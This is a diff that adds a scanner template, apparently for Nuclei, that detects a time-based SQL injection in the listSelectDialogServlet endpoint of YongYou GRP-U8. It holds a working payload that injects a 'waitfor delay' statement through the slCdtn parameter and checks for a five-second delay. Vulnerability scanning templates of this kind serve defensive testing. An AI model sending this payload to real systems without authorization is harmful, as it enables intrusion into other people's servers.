@@ -1,0 +1,29 @@
+id: YongYouGRPU8_listSelectDialogServlet_sqlInjection
+
+info:
+  name: YongYouGRPU8_listSelectDialogServlet_sqlInjection
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:5%27 HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
